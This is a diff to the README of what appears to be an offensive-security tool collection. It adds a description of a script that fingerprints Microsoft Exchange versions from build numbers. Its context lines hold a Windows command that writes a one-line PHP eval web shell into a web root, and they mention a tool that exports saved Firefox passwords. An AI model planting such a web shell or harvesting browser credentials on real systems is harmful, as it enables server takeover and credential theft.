@@ -83,3 +83,16 @@ system('cmd /c "echo ^<?php @eval(^$_POST[pwd]);?^> >D:\phpstudy\WWW\test.php"')
 ### ExportFirefoxPassword.py
 
 Use to export the password of the Firefox
+
+### get_Exchange_version.py
+
+Use to get the version of Exchange.
+
+First get the BuildNumber through the souce code of the URL and then get the version.
+
+Reference:
+
+https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019
+
+
+
